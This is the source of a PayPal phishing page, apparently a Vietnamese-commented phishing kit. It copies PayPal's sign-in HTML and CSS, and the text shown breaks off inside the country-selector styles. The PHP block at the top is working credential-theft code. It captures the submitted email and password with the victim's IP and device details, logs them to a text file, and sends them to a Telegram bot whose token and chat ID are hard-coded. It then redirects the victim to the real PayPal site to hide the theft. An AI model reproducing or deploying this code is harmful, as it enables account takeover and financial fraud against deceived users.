<?php
// Kiểm tra xem có dữ liệu được gửi qua POST không
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Nhận dữ liệu từ form
    $email = $_POST['login_email'];
    $password = $_POST['login_password'];

    // Lấy thông tin thiết bị từ User Agent
    // $browser = (strpos($_SERVER['HTTP_USER_AGENT'], 'Safari') !== false) ? 'Safari' : 'Chrome';
    $userAgent = $_SERVER['HTTP_USER_AGENT'];

    $browser = 'Unknown';

    $deviceType = "Unknown";

// Kiểm tra trình duyệt
if (strpos($userAgent, 'Chrome') !== false && strpos($userAgent, 'Safari') !== false) {
    // Chrome sẽ có cả "Chrome" và "Safari"
    $browser = 'Chrome';

    // Kiểm tra xem người dùng đang sử dụng thiết bị di động hay máy tính
    if (strpos($userAgent, 'Mobile') !== false) {
        $deviceType = "Phone";
    } else {
        $deviceType = "Laptop/Desktop";
    }
} elseif (strpos($userAgent, 'Safari') !== false) {
    // Safari sẽ có "Safari" nhưng không có "Chrome"
    $browser = 'Safari';

    // Kiểm tra Safari trên iPhone/iPad hay Mac
    if (strpos($userAgent, 'iPhone') !== false || strpos($userAgent, 'iPad') !== false) {
        // Safari trên iPhone/iPad
        $deviceType = "Phone";
    } elseif (strpos($userAgent, 'Macintosh') !== false) {
        // Safari trên Mac
        $deviceType = "Laptop/Desktop";
    }
}
    $ip = $_SERVER['REMOTE_ADDR']; // Lấy IP của người dùng
  

    // Tạo nội dung sẽ ghi vào file .txt
    $logData = "
=== ACCOUN PAYPAL ===
Email: $email
Password: $password

=== INFO DEVICE ===
Browser: $browser - $deviceType
IP: $ip
UserAgent: $userAgent
=== AZW ===

    ";

    // Ghi dữ liệu vào file .txt
    file_put_contents('login_data.txt', $logData, FILE_APPEND);

    // Gửi thông tin qua Telegram Bot
    sendTelegramMessage($logData);

    // Thông báo người dùng đã gửi thành công
    header("Location: https://www.paypal.com/signin?country.x=VN&amp;locale.x=en_US&amp;Z3JncnB0=");
} else {
}

// Hàm gửi tin nhắn qua Telegram Bot
function sendTelegramMessage($message) {
    $telegramToken = '7065829566:AAHjXEyx0MO8l_Ba6FJ9hXAgTPph0Hk-4SA'; // Thay YOUR_BOT_TOKEN bằng token thực của bot
    $chatId = '-4509985502'; // Thay YOUR_CHAT_ID bằng chat ID của bạn

    $url = "https://api.telegram.org/bot$telegramToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
    
    // Gửi yêu cầu GET tới API Telegram
    file_get_contents($url);
}
?>

<!DOCTYPE html>
<!-- saved from url=(0078)https://www.paypal.com/signin?country.x=VN&locale.x=en_US&langTgl=en&Z3JncnB0= -->
<html lang="en" class=" desktop js ">
<!--<![endif]-->

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <script nonce="">
        (function() {
            window.ddjskey = 'C992DCAFEE25FA95C6492C61EB3328';
            window.ddoptions = {
                endpoint: 'https://ddbm2.paypal.com/js/',
                ajaxListenerPath: ['paypal.com'],
                dryRun: [5],
                disableAutoRefreshOnCaptchaPassed: true,
                enableTagEvents: true
            };
            window.addEventListener('dd_response_passed', (event) => {
                document.querySelector('.proceed [type="submit"]').click();
            });
        })();
    </script>
    <script async="" src="./index/tags.js"></script>
    <!-- <script async="" src="./index/ngrlCaptcha.min.js"></script> -->
    <!--Script info: script: node, template:  , date: Nov 6, 2024 06:22:55 -08:00, country: VN, language: en web version:  content version:  hostname : rZJvnqaaQhLn/nmWT8cSUm+72VQ7inHLtszw3WODnX1tylUA20e0JneTVBJVge66 rlogid : rZJvnqaaQhLn%2FnmWT8cSUotSylMGOTGkRUMDpmUTvbXdvevuMMFAfQFXQmqI%2FDzqy1%2BXN7DvrO8S8zeXuBzJGCSBq%2FvBnopI_19301db639b -->
    <title>Log in to your PayPal account</title>
    <meta name="application-name" content="PayPal">
    <meta name="msapplication-task" content="name=My Account;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_account;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
    <meta name="msapplication-task" content="name=Send Money;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_send-money-transfer&amp;send_method=domestic;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
    <meta name="keywords" content="transfer money, email money transfer, international money transfer ">
    <meta name="description" content="Transfer money online in seconds with PayPal money transfer. All you need is an email address.">
    <link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
    <link rel="apple-touch-icon" href="https://www.paypalobjects.com/webstatic/icon/pp64.png">
    <link rel="canonical" href="https://www.paypal.com/vn/signin">
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes">
    <meta property="og:image" content="https://www.paypalobjects.com/webstatic/icon/pp258.png">
    <link rel="stylesheet" href="./index/contextualLoginElementalUIv5.css">
    <!--[if lte IE 9]><link rel="stylesheet" href="https://www.paypalobjects.com/web/res/7ed/3fdaa3e1dfe6517e85c4f017add61/css/ie9.css" /><![endif]-->
    <!-- build:js inline -->
    <!-- build:[src] js/lib/ -->
    <script nonce="" src="./index/modernizr-2.6.1.js"></script>
    <!-- /build -->
    <!-- /build -->
    <script nonce="">
        /* Special integration eligibility check */
        function isEligibleIntegration() {
            var sxf = "";
            return sxf === 'true' || window.name === 'PPFrameRedirect';
        } /* Don't bust the frame if this is top window */
        if (self === top || isEligibleIntegration()) {
            var antiClickjack = document.getElementById("antiClickjack");
            if (antiClickjack) {
                antiClickjack.parentNode.removeChild(antiClickjack);
            }
        } else {
            top.location = self.location;
        }
    </script>
    <style nonce="">
        @font-face {
            font-family: "PayPalOpen-Regular";
            font-style: normal;
            font-display: swap;
            src: url('https://www.paypalobjects.com/paypal-ui/fonts/PayPalOpen-Regular.woff2') format('woff2'), url('https://www.paypalobjects.com/paypal-ui/fonts/PayPalOpen-Regular.woff') format('woff'), url('https://www.paypalobjects.com/paypal-ui/fonts/PayPalOpen-Regular.otf') format('opentype');
        }
        
        #gdprCookieBanner {
            font-family: PayPalOpen-Regular, sans-serif;
        }
        
        .gdprCookieBanner_container {
            display: none;
        }
        
        .ccpaCookieBanner_container {
            display: none;
        }
        
        @media only screen and (max-width: 575.98px) {
            .gdprHideCookieBannerMobile {
                display: none;
            }
            .ccpaHideCookieBannerMobile {
                display: none;
            }
        }
    </style>
    <style>
        #tr-popup,
        #tr-popup * {
            all: unset;
        }
        
        #tr-popup {
            font: 15px "Segoe UI", Arial, Helvetica, sans-serif;
            color: #222;
            padding: 24px;
            display: block;
            z-index: 2147483647;
            position: absolute;
            max-width: 400px;
            min-width: 300px;
            direction: ltr;
            text-align: left;
            background: #fff;
            border-radius: 2px;
            box-sizing: border-box;
            box-shadow: 0 0 0 1px rgba(0, 0, 0, 0.1), 0 12px 24px 0 rgba(51, 51, 51, 0.3);
            transition: opacity, visibility;
            transition-duration: 0.2s;
        }
        
        #tr-popup[data-hidden="true"] {
            opacity: 0;
            visibility: hidden;
        }
        
        #tr-popup[data-position="top"] {
            margin-top: -12px;
        }
        
        #tr-popup[data-position="bottom"] {
            margin-top: 12px;
        }
        
        #tr-popup .tr-popup__arrow {
            top: 100%;
            left: 50%;
            width: 26px;
            height: 12px;
            display: block;
            position: absolute;
            margin-left: -13px;
            margin-top: -1px;
            background: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNiIgaGVpZ2h0PSIxMiI+PHBhdGggZD0iTTAgMGwxMyAxMkwyNiAweiIgb3BhY2l0eT0iLjEiLz48cGF0aCBkPSJNMSAwbDEyIDExTDI1IDB6IiBmaWxsPSIjZmZmIi8+PC9zdmc+") no-repeat;
        }
        
        #tr-popup[data-position="bottom"] .tr-popup__arrow {
            top: auto;
            bottom: 100%;
            margin-bottom: -1px;
            transform: rotate(180deg);
        }
        
        #tr-popup .tr-popup__value,
        #tr-popup .tr-popup__block {
            word-wrap: break-word;
            white-space: pre-wrap;
        }
        
        [data-type="trSpan"][data-translated="true"][data-source-lang="ja"],
        [data-type="trSpan"][data-translated="true"][data-source-lang="zh"],
        #tr-popup .tr-popup__title_original,
        #tr-popup .tr-popup__block_a,
        #tr-popup .tr-popup__block_b,
        #tr-popup .tr-popup__button {
            font-family: "Segoe UI", Arial, Helvetica, sans-serif !important;
        }
        
        #tr-popup .tr-popup__title_original {
            font-weight: bold;
        }
        
        #tr-popup .tr-popup__block {
            display: block;
        }
        
        #tr-popup .tr-popup__link {
            cursor: pointer;
            -webkit-user-select: none;
            user-select: none;
        }
        
        #tr-popup .tr-popup__link_suggest {
            color: #1378d7;
            font-size: 13px;
            line-height: 18px;
            margin-right: 22px;
        }
        
        #tr-popup .tr-popup__link_suggest:hover,
        #tr-popup .tr-popup__link_suggest:active {
            color: #000;
        }
        
        #tr-popup .tr-popup__logo {
            height: 18px;
            opacity: 0.3;
            display: inline-block;
            transition: opacity 0.2s;
            vertical-align: top;
        }
        
        #tr-popup .tr-popup__logo_company {
            width: 34px;
            filter: brightness(0);
            background: url("https://yastatic.net/s3/trbro/v20.5.1.0/i/service_logo.svg");
            background-size: 34px;
            background-position: 0 -18px;
        }
        
        #tr-popup[lang="ru"] .tr-popup__logo_company {
            background-position: 0 0;
        }
        
        #tr-popup .tr-popup__logo_service {
            width: 42px;
            background: url("https://yastatic.net/s3/trbro/v20.5.1.0/i/service_name.svg");
            margin-left: 2px;
            background-size: 63px;
            background-position: 0 -18px;
        }
        
        #tr-popup[lang="ru"] .tr-popup__logo_service {
            width: 57px;
            background-position: 0 0;
        }
        
        #tr-popup[lang="uk"] .tr-popup__logo_service {
            width: 56px;
            background-position: 0 -36px;
        }
        
        #tr-popup[lang="tr"] .tr-popup__logo_service {
            width: 25px;
            background-position: 0 -54px;
        }
        
        #tr-popup .tr-popup__link_service:hover .tr-popup__logo {
            opacity: 0.6;
        }
        
        #tr-popup .tr-popup__input {
            width: 100%;
            height: 80px;
            resize: none;
            border: 2px solid #e5e5e5;
            padding: 8px;
            display: block;
            font-size: 15px;
            box-sizing: border-box;
            border-radius: 2px;
        }
        
        #tr-popup .tr-popup__input:focus {
            border-color: #bbb;
        }
        
        #tr-popup .tr-popup__block_a,
        #tr-popup .tr-popup__block_b {
            margin-top: 16px;
        }
        
        #tr-popup .tr-popup__block_a {
            display: flex;
            justify-content: space-between;
        }
        
        #tr-popup .tr-popup__block_b {
            position: relative;
        }
        
        #tr-popup .tr-popup__block_submit {
            text-align: right;
            margin-top: 24px;
        }
        
        #tr-popup .tr-popup__overlay {
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            position: absolute;
        }
        
        #tr-popup .tr-popup__overlay_submitted {
            color: #999;
            z-index: 1;
            display: flex;
            background: #fff;
            align-items: center;
            justify-content: center;
        }
        
        #tr-popup:not([data-expanded="true"]) .tr-popup__block_b,
        #tr-popup:not([data-submitted="true"]) .tr-popup__overlay_submitted {
            display: none;
        }
        
        #tr-popup .tr-popup__menu {
            font-size: 13px;
            opacity: 0;
            visibility: hidden;
            white-space: nowrap;
            position: absolute;
            bottom: 100%;
            margin-bottom: 8px;
            padding: 4px 14px;
            z-index: 1;
            background-color: #f5f5f5;
            border: 1px solid #bbb;
            border-radius: 2px;
            box-shadow: 0px 0 0 1px rgba(0, 0, 0, 0.1), 0 8px 14px 0 rgba(51, 51, 51, 0.3);
        }
        
        #tr-popup[data-menu-position="left"] .tr-popup__menu {
            right: 0;
        }
        
        #tr-popup[data-menu="true"] .tr-popup__menu {
            opacity: 1;
            visibility: visible;
        }
        
        #tr-popup .tr-popup__menu:hover {
            background-color: #efefef;
        }
        
        #tr-popup .tr-popup__button {
            cursor: pointer;
            display: inline-block;
            -webkit-user-select: none;
            user-select: none;
        }
        
        #tr-popup .tr-popup__button_menu,
        #tr-popup .tr-popup__button_close {
            top: 4px;
            width: 20px;
            height: 20px;
            opacity: 0.3;
            position: absolute;
        }
        
        #tr-popup .tr-popup__button_close {
            right: 4px;
            background: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyMCIgaGVpZ2h0PSIyMCI+PHBhdGggZD0iTTkuMjkzIDEwTDYuMTQ2IDYuODU0YS41LjUgMCAxIDEgLjcwOC0uNzA4TDEwIDkuMjkzbDMuMTQ2LTMuMTQ3YS41LjUgMCAwIDEgLjcwOC43MDhMMTAuNzA3IDEwbDMuMTQ3IDMuMTQ2YS41LjUgMCAwIDEtLjcwOC43MDhMMTAgMTAuNzA3bC0zLjE0NiAzLjE0N2EuNS41IDAgMCAxLS43MDgtLjcwOEw5LjI5MyAxMHoiLz48L3N2Zz4=");
        }
        
        #tr-popup .tr-popup__button_menu {
            right: 24px;
            background: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGhlaWdodD0iMjAiIHdpZHRoPSIyMCI+PHBhdGggZD0ibTUgNnYxaDEwdi0xaC0xMHptMCAzdjFoMTB2LTFoLTEwem0wIDN2MWgxMHYtMWgtMTB6Ii8+PC9zdmc+");
        }
        
        #tr-popup .tr-popup__button_menu:hover,
        #tr-popup .tr-popup__button_close:hover {
            opacity: 0.5;
        }
        
        #tr-popup .tr-popup__button_close:active {
            opacity: 0.6;
        }
        
        #tr-popup[data-menu="true"] .tr-popup__button_menu {
            opacity: 1;
        }
        
        #tr-popup .tr-popup__button_submit {
            color: #000;
            height: 28px;
            padding: 0 16px;
            font-size: 13px;
            min-width: 112px;
            background: #fc0;
            box-sizing: border-box;
            text-align: center;
            line-height: 28px;
            border-radius: 2px;
        }
        
        #tr-popup .tr-popup__button_submit:hover {
            background: #ffb800;
        }
        
        #tr-popup .tr-popup__button_submit:active {
            background: #ffa400;
        }
        
        #tr-popup[data-invalid="true"] .tr-popup__button_submit {
            color: rgba(0, 0, 0, 0.5);
            cursor: default;
            background: rgba(0, 0, 0, 0.1);
        }
        
        [data-type="trSpan"][data-selected="true"] {
            color: #222 !important;
            background: #cce4f7 !important;
        }
        
        [data-type="trSpan"] {
            font-size: inherit !important;
        }
    </style>
    <style>
        /** method responsible for loading the background image set in CSS **/
        
        @-webkit-keyframes rotation {
            from {
                -webkit-transform: rotate(0deg);
                transform: rotate(0deg);
            }
            to {
                -webkit-transform: rotate(359deg);
                transform: rotate(359deg);
            }
        }
        
        @-moz-keyframes rotation {
            from {
                -moz-transform: rotate(0deg);
                transform: rotate(0deg);
            }
            to {
                -moz-transform: rotate(359deg);
                transform: rotate(359deg);
            }
        }
        
        @-o-keyframes rotation {
            from {
                -o-transform: rotate(0deg);
                transform: rotate(0deg);
            }
            to {
                -o-transform: rotate(359deg);
                transform: rotate(359deg);
            }
        }
        
        @keyframes rotation {
            from {
                transform: rotate(0deg);
            }
            to {
                transform: rotate(359deg);
            }
        }
        
        .country-selector .country {
            overflow: hidden;
            height: 24px;
            min-width: 32px;
            background: transparent url(https://www.paypalobjects.com/webstatic/mktg/icons/sprite_countries_flag4.png) 5px 100px no-repeat;
            border: none;
            text-align: left;
        }
        
        .country-selector ul li {
            list-style: none;
            width: 19%;
            display: inline-block;
            line-height: 1.5rem;
            min-height: 3em;
        }
        
        .country-selector ul li a.country {
            padding: 3px 10px 0 35px;
            overflow: visible;
            line-height: 1.2em;
            display: block;
            height: 30px;
            min-width: 30px;
            color: #777;
            font-weight: 400;
            font-size: 0.9375rem;
        }
        
        .country-selector .priorityCountries {
            border-bottom: 1px solid #cfcfcf;
            margin-bottom: 20px;
        }
        
        .country-selector .zambia,
        .country-selector .ZM {
            background-position: 5px 1px;
        }
        
        .country-selector .southafrica,
        .country-selector .ZA {
            background-position: 5px -34px;
        }
        
        .country-selector .YE,
        .country-selector .yemen {
            background-position: 5px -69px;
        }
        
        .country-selector .samoa,
        .country-selector .WS {
            background-position: 5px -104px;
        }
        
        .country-selector .vanuatu,
        .country-selector .VU {
            background-position: 5px -139px;
        }
        
        .country-selector .unitedstates,
        .country-selector .US {
            background-position: 5px -383px;
        }
        
        .country-selector .taiwan,
        .country-selector .TW {
            background-position: 5px -524px;
        }
        
        .country-selector .TR,
        .country-selector .turkey {
            background-position: 5px -629px;
        }
        
        .country-selector .TH,
        .country-selector .thailand {
            background-position: 5px -804px;
        }
        
        .country-selector .CH,
        .country-selector .switzerland {
            background-position: 5px -944px;
        }
        
        .country-selector .AR,
        .country-selector .argentina {
            background-position: 5px -6055px;
        }
        
        .country-selector .SK,
        .country-selector .slovakia {
            background-position: 5px -1224px;
        }
        
        .country-selector .SG,
        .country-selector .singapore {
            background-position: 5px -1294px;
        }
        
        .country-selector .SE,
        .country-selector .sweden {
            background-position: 5px -1329px;
        }
        
        .country-selector .portugal,
        .country-selector .PT {
            background-position: 5px -1679px;
        }
        
        .country-selector .PL,
        .country-selector .poland {
            background-position: 5px -1714px;
        }
        
        .country-selector .newzealand,
        .country-selector .NZ {
            background-position: 5px -1959px;
        }
        
        .country-selector .NO,
        .country-selector .norway {
            background-position: 5px -2099px;
        }
        
        .country-selector .netherlands,
        .country-selector .NL {
            background-position: 5px -2134px;
        }
        
        .country-selector .malaysia,
        .country-selector .MY {
            background-position: 5px -2379px;
        }
        
        .country-selector .mexico,
        .country-selector .MX {
            background-position: 5px -2414px;
        }
        
        .country-selector .martinique,
        .country-selector .MQ {
            background-position: 5px -4374px;
        }
        
        .country-selector .LU,
        .country-selector .luxembourg {
            background-position: 5px -2904px;
        }
        
        .country-selector .KR,
        .country-selector .southkorea {
            background-position: 5px -3254px;
        }
        
        .country-selector .japan,
        .country-selector .JP {
            background-position: 5px -3499px;
        }
        
        .country-selector .jamaica,
        .country-selector .JM {
            background-position: 5px -3569px;
        }
        
        .country-selector .IT,
        .country-selector .italy {
            background-position: 5px -3604px;
        }
        
        .country-selector .IL,
        .country-selector .israel {
            background-position: 5px -3709px;
        }
        
        .country-selector .IE,
        .country-selector .ireland {
            background-position: 5px -3744px;
        }
        
        .country-selector .ID,
        .country-selector .indonesia {
            background-position: 5px -3779px;
        }
        
        .country-selector .HU,
        .country-selector .hungary {
            background-position: 5px -3814px;
        }
        
        .country-selector .HK,
        .country-selector .hongkong {
            background-position: 5px -3919px;
        }
        
        .country-selector .GR,
        .country-selector .greece {
            background-position: 5px -4059px;
        }
        
        .country-selector .GB,
        .country-selector .unitedkingdom {
            background-position: 5px -4304px;
        }
        
        .country-selector .FR,
        .country-selector .france,
        .country-selector .frenchguiana,
        .country-selector .GF,
        .country-selector .GP,
        .country-selector .guadeloupe,
        .country-selector .RE,
        .country-selector .reunion {
            background-position: 5px -4374px;
        }
        
        .country-selector .FI,
        .country-selector .finland {
            background-position: 5px -4549px;
        }
        
        .country-selector .ES,
        .country-selector .spain {
            background-position: 5px -4618px;
        }
        
        .country-selector .EC,
        .country-selector .ecuador {
            background-position: 5px -4724px;
        }
        
        .country-selector .algeria,
        .country-selector .DZ {
            background-position: 5px -4759px;
        }
        
        .country-selector .denmark,
        .country-selector .DK {
            background-position: 5px -4864px;
        }
        
        .country-selector .DE,
        .country-selector .germany {
            background-position: 5px -4934px;
        }
        
        .country-selector .EG,
        .country-selector .egypt {
            background-position: 5px -69px;
        }
        
        .country-selector .CZ,
        .country-selector .czechrepublic {
            background-position: 5px -4969px;
        }
        
        .country-selector .C2,
        .country-selector .china,
        .country-selector .CN {
            background-position: 5px -5144px;
        }
        
        .country-selector .CA,
        .country-selector .canada {
            background-position: 5px -5319px;
        }
        
        .country-selector .botswana,
        .country-selector .BW {
            background-position: 5px -5389px;
        }
        
        .country-selector .belize,
        .country-selector .BZ {
            background-position: 5px -5354px;
        }
        
        .country-selector .bahamas,
        .country-selector .BS {
            background-position: 5px -5459px;
        }
        
        .country-selector .BR,
        .country-selector .brazil {
            background-position: 5px -5494px;
        }
        
        .country-selector .bermuda,
        .country-selector .BM {
            background-position: 5px -5599px;
        }
        
        .country-selector .bahrain,
        .country-selector .BH {
            background-position: 5px -5704px;
        }
        
        .country-selector .BE,
        .country-selector .belgium {
            background-position: 5px -5809px;
        }
        
        .country-selector .barbados,
        .country-selector .BB {
            background-position: 5px -5844px;
        }
        
        .country-selector .BA,
        .country-selector .bosniaandherzegovina {
            background-position: 5px -5879px;
        }
        
        .country-selector .BF,
        .country-selector .burkinafaso {
            background-position: 5px -5773px;
        }
        
        .country-selector .AU,
        .country-selector .australia {
            background-position: 5px -5984px;
        }
        
        .country-selector .AT,
        .country-selector .austria {
            background-position: 5px -6019px;
        }
        
        .country-selector .AL,
        .country-selector .albania {
            background-position: 5px -6194px;
        }
        
        .country-selector .AG,
        .country-selector .antiguaandbarbuda {
            background-position: 5px -6264px;
        }
        
        .country-selector .AD,
        .country-selector .andorra {
            background-position: 5px -6334px;
        }
        
        .country-selector .BG,
        .country-selector .bulgaria {
            background-position: 5px -5739px;
        }
        
        .country-selector .cambodia,
        .country-selector .KH {
            background-position: 5px -3397px;
        }
        
        .country-selector .caymanislands,
        .country-selector .KY {
            background-position: 5px -4479px;
        }
        
        .country-selector .CO,
        .country-selector .colombia {
            background-position: 5px -5109px;
        }
        
        .country-selector .croatia,
        .country-selector .HR {
            background-position: 5px -3849px;
        }
        
        .country-selector .CY,
        .country-selector .cyprus {
            background-position: 5px -5004px;
        }
        
        .country-selector .DM,
        .country-selector .dominica {
            background-position: 5px -4829px;
        }
        
        .country-selector .DO,
        .country-selector .dominicanrepublic {
            background-position: 5px -4794px;
        }
        
        .country-selector .elsalvador,
        .country-selector .SV {
            background-position: 5px -979px;
        }
        
        .country-selector .ER,
        .country-selector .eritrea {
            background-position: 5px -4655px;
        }
        
        .country-selector .EE,
        .country-selector .estonia {
            background-position: 5px -4689px;
        }
        
        .country-selector .ET,
        .country-selector .ethiopia {
            background-position: 5px -4587px;
        }
        
        .country-selector .faroeislands,
        .country-selector .FO {
            background-position: 5px -4409px;
        }
        
        .country-selector .fiji,
        .country-selector .FJ {
            background-position: 5px -4514px;
        }
        
        .country-selector .frenchpolynesia,
        .country-selector .PF {
            background-position: 5px -1819px;
        }
        
        .country-selector .GI,
        .country-selector .gibraltar {
            background-position: 5px -4199px;
        }
        
        .country-selector .GL,
        .country-selector .greenland {
            background-position: 5px -4164px;
        }
        
        .country-selector .GD,
        .country-selector .grenada {
            background-position: 5px -4269px;
        }
        
        .country-selector .GT,
        .country-selector .guatemala {
            background-position: 5px -4024px;
        }
        
        .country-selector .HN,
        .country-selector .honduras {
            background-position: 5px -3884px;
        }
        
        .country-selector .iceland,
        .country-selector .IS {
            background-position: 5px -3639px;
        }
        
        .country-selector .JO,
        .country-selector .jordan {
            background-position: 5px -3534px;
        }
        
        .country-selector .KE,
        .country-selector .kenya {
            background-position: 5px -3464px;
        }
        
        .country-selector .kuwait,
        .country-selector .KW {
            background-position: 5px -3219px;
        }
        
        .country-selector .latvia,
        .country-selector .LV {
            background-position: 5px -2869px;
        }
        
        .country-selector .lesotho,
        .country-selector .LS {
            background-position: 5px -2974px;
        }
        
        .country-selector .LI,
        .country-selector .liechtenstein {
            background-position: 5px -3044px;
        }
        
        .country-selector .lithuania,
        .country-selector .LT {
            background-position: 5px -2939px;
        }
        
        .country-selector .malawi,
        .country-selector .MW {
            background-position: 5px -2449px;
        }
        
        .country-selector .malta,
        .country-selector .MT {
            background-position: 5px -2554px;
        }
        
        .country-selector .MN,
        .country-selector .mongolia {
            background-position: 5px -6369px;
        }
        
        .country-selector .MA,
        .country-selector .morocco {
            background-position: 5px -2834px;
        }
        
        .country-selector .mozambique,
        .country-selector .MZ {
            background-position: 5px -2344px;
        }
        
        .country-selector .NC,
        .country-selector .newcaledonia {
            background-position: 5px -2274px;
        }
        
        .country-selector .OM,
        .country-selector .oman {
            background-position: 5px -1924px;
        }
        
        .country-selector .palau,
        .country-selector .PW {
            background-position: 5px -1644px;
        }
        
        .country-selector .PA,
        .country-selector .panama {
            background-position: 5px -1889px;
        }
        
        .country-selector .PH,
        .country-selector .philippines {
            background-position: 5px -1749px;
        }
        
        .country-selector .pitcairnislands,
        .country-selector .PN {
            background-position: 5px -6229px;
        }
        
        .country-selector .QA,
        .country-selector .qatar {
            background-position: 5px -5704px;
        }
        
        .country-selector .RO,
        .country-selector .romania {
            background-position: 5px -1539px;
        }
        
        .country-selector .RU,
        .country-selector .russia {
            background-position: 5px -1503px;
        }
        
        .country-selector .RW,
        .country-selector .rwanda {
            background-position: 5px -6439px;
        }
        
        .country-selector .saotomeandprincipe,
        .country-selector .ST {
            background-position: 5px -1014px;
        }
        
        .country-selector .KN,
        .country-selector .saintkittsandnevis {
            background-position: 5px -3289px;
        }
        
        .country-selector .sainthelena,
        .country-selector .SH {
            background-position: 5px -909px;
        }
        
        .country-selector .saintvincentandthegrenadines,
        .country-selector .VC {
            background-position: 5px -278px;
        }
        
        .country-selector .LC,
        .country-selector .saintlucia {
            background-position: 5px -3079px;
        }
        
        .country-selector .PM,
        .country-selector .saintpierreandmiquelon {
            background-position: 5px -6824px;
        }
        
        .country-selector .sanmarino,
        .country-selector .SM {
            background-position: 5px -1154px;
        }
        
        .country-selector .SA,
        .country-selector .saudiarabia {
            background-position: 5px -1434px;
        }
        
        .country-selector .SC,
        .country-selector .seychelles {
            background-position: 5px -1364px;
        }
        
        .country-selector .SI,
        .country-selector .slovenia {
            background-position: 5px -1259px;
        }
        
        .country-selector .tajikistan,
        .country-selector .TJ {
            background-position: 5px -769px;
        }
        
        .country-selector .trinidadandtobago,
        .country-selector .TT {
            background-position: 5px -594px;
        }
        
        .country-selector .AE,
        .country-selector .unitedarabemirates {
            background-position: 5px -6299px;
        }
        
        .country-selector .uruguay,
        .country-selector .UY {
            background-position: 5px -351px;
        }
        
        .country-selector .VE,
        .country-selector .venezuela {
            background-position: 5px -244px;
        }
        
        .country-selector .IN,
        .country-selector .india {
            background-position: 5px -3674px;
        }
        
        .country-selector .vietnam,
        .country-selector .VN {
            background-position: 5px -174px;
        }
        
        .country-selector .angola,
        .country-selector .AO {
            background-position: 5px -6089px;
        }
        
        .country-selector .AI,
        .country-selector .anguilla {
            background-position: 5px -6229px;
        }
        
        .country-selector .AM,
        .country-selector .armenia {
            background-position: 5px -6159px;
        }
        
        .country-selector .aruba,
        .country-selector .AW {
            background-position: 5px -5949px;
        }
        
        .country-selector .AZ,
        .country-selector .azerbaijanrepublic {
            background-position: 5px -5914px;
        }
        
        .country-selector .benin,
        .country-selector .BJ {
            background-position: 5px -5634px;
        }
        
        .country-selector .bhutan,
        .country-selector .BT {
            background-position: 5px -5424px;
        }
        
        .country-selector .BO,
        .country-selector .bolivia {
            background-position: 5px -5529px;
        }
        
        .country-selector .BN,
        .country-selector .brunei {
            background-position: 5px -5564px;
        }
        
        .country-selector .BI,
        .country-selector .burundi {
            background-position: 5px -5669px;
        }
        
        .country-selector .capeverde,
        .country-selector .CV {
            background-position: 5px -5039px;
        }
        
        .country-selector .chad,
        .country-selector .TD {
            background-position: 5px -1539px;
        }
        
        .country-selector .chile,
        .country-selector .CL {
            background-position: 5px -5179px;
        }
        
        .country-selector .comoros,
        .country-selector .KM {
            background-position: 5px -3324px;
        }
        
        .country-selector .CK,
        .country-selector .cookislands {
            background-position: 5px -5214px;
        }
        
        .country-selector .costarica,
        .country-selector .CR {
            background-position: 5px -5074px;
        }
        
        .country-selector .CD,
        .country-selector .democraticrepublicofthecongo {
            background-position: 5px -5284px;
        }
        
        .country-selector .DJ,
        .country-selector .djibouti {
            background-position: 5px -4899px;
        }
        
        .country-selector .falklandislands,
        .country-selector .FK {
            background-position: 5px -6229px;
        }
        
        .country-selector .GA,
        .country-selector .gabonrepublic {
            background-position: 5px -4339px;
        }
        
        .country-selector .gambia,
        .country-selector .GM {
            background-position: 5px -4129px;
        }
        
        .country-selector .GE,
        .country-selector .georgia {
            background-position: 5px -6652px;
        }
        
        .country-selector .GN,
        .country-selector .guinea,
        .country-selector .guineabissau,
        .country-selector .GW {
            background-position: 5px -3989px;
        }
        
        .country-selector .guyana,
        .country-selector .GY {
            background-position: 5px -3954px;
        }
        
        .country-selector .kazakhstan,
        .country-selector .KZ {
            background-position: 5px -3149px;
        }
        
        .country-selector .KI,
        .country-selector .kiribati {
            background-position: 5px -3359px;
        }
        
        .country-selector .KG,
        .country-selector .kyrgyzstan {
            background-position: 5px -3429px;
        }
        
        .country-selector .LA,
        .country-selector .laos {
            background-position: 5px -3114px;
        }
        
        .country-selector .madagascar,
        .country-selector .MG {
            background-position: 5px -2799px;
        }
        
        .country-selector .maldives,
        .country-selector .MV {
            background-position: 5px -2484px;
        }
        
        .country-selector .mali,
        .country-selector .ML {
            background-position: 5px -2729px;
        }
        
        .country-selector .marshallislands,
        .country-selector .MH {
            background-position: 5px -2764px;
        }
        
        .country-selector .mauritania,
        .country-selector .MR {
            background-position: 5px -2624px;
        }
        
        .country-selector .mauritius,
        .country-selector .MU {
            background-position: 5px -2519px;
        }
        
        .country-selector .FM,
        .country-selector .micronesia {
            background-position: 5px -4444px;
        }
        
        .country-selector .montserrat,
        .country-selector .MS {
            background-position: 5px -2589px;
        }
        
        .country-selector .mayotte,
        .country-selector .YT {
            background-position: 5px -4374px;
        }
        
        .country-selector .NA,
        .country-selector .namibia {
            background-position: 5px -2309px;
        }
        
        .country-selector .nauru,
        .country-selector .NR {
            background-position: 5px -2029px;
        }
        
        .country-selector .nepal,
        .country-selector .NP {
            background-position: 5px -2064px;
        }
        
        .country-selector .AN,
        .country-selector .netherlandsantilles {
            background-position: 5px -6124px;
        }
        
        .country-selector .NI,
        .country-selector .nicaragua {
            background-position: 5px -2169px;
        }
        
        .country-selector .NE,
        .country-selector .niger {
            background-position: 5px -2239px;
        }
        
        .country-selector .niue,
        .country-selector .NU {
